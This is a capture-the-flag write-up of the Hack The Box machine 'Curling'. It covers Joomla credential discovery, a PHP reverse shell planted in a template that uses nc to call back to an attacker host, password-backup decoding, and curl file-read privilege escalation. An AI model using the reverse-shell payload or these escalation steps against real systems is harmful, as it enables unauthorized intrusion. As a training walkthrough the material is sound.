---
title: "HTB - Curling"
permalink: /Curling/
layout: single
author-profile: true
---
## Scanning
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -Pn -p22,80 -A 10.10.10.150
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-03 04:52 EDT
Nmap scan report for 10.10.10.150
Host is up (0.028s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

First I searched for apache vulnerbilities but did not find anything useful so I went on to manually exploring the webpage.

since the webpage is titled `Cewl Curling Site` I used cewl to get a wordlist incase I needed it later.

I then looked at the page source and found a reference to a file called secret.txt, This file contains a base64 encoded string.

``Q3VybGluZzIwMTgh``

Using CyberChef I decoded this as:

``Curling2018!``

we have a password but no username. I continue to look around the site and start to make a username list:

```
Super User
admin
Floris
```

Using Floris I was able to get access to an account. This account also has access to the Joomla admin panel but not ssh to the server.

## Exploitation

navigating to the template folder I can create a file in the protostart template. This will allow me to execute a reverse shell using php

```
<?php
    system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 4444 >/tmp/f');
?>
```

On netcat I got a shell as www-data 

```
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4444                                               
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.150] 59054
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

After navigating to floris' home folder, I find a password backup:
```
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H
```

I copied this text and pasted it in a text file using nano.

To decrypt this backup I needed to use xxd.

``xxd -r password backup`` 

This didn't work so i tried outputting it to a file.

``xxd -r password backup > backup``

running ``file backup`` I found out it was a bzip2 file.

I decreypted it to just get another encrypted file. This was excryipted usign gzip. Doing this a few more times, I was able to get a password.txt file.

```
┌──(kali㉿kali)-[~]
└─$ tar -vxf backup       
password.txt
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ cat password.txt    
5d<wdCbdZu)|hChXll
```
This password allowed me to login to floris' account using ssh.

```
floris@curling:~$ whoami
floris
floris@curling:~$ ls
admin-area  password_backup  user.txt
floris@curling:~$ cat user.txt
65dd1df0713b40d88ead98cf********
```
Going into the `admin-area` directory, I found a input and a reoprt file.

It looks like teh report file is taking the input and using curl to connect to the address which is in the input file.

I chcanged the file from:

```
url = "http://127.0.0.1"

```
to:
```
file = "http:///root/root.txt"
```
I then used ``watch cat report`` to view the output everytime the file is run, this gave us the root flag.

```
Every 2.0s: cat report                                                                                                                                                                                     curling: Fri Jun  3 10:19:23 2022

82c198ab6fc5365fdc6da2ee********
```
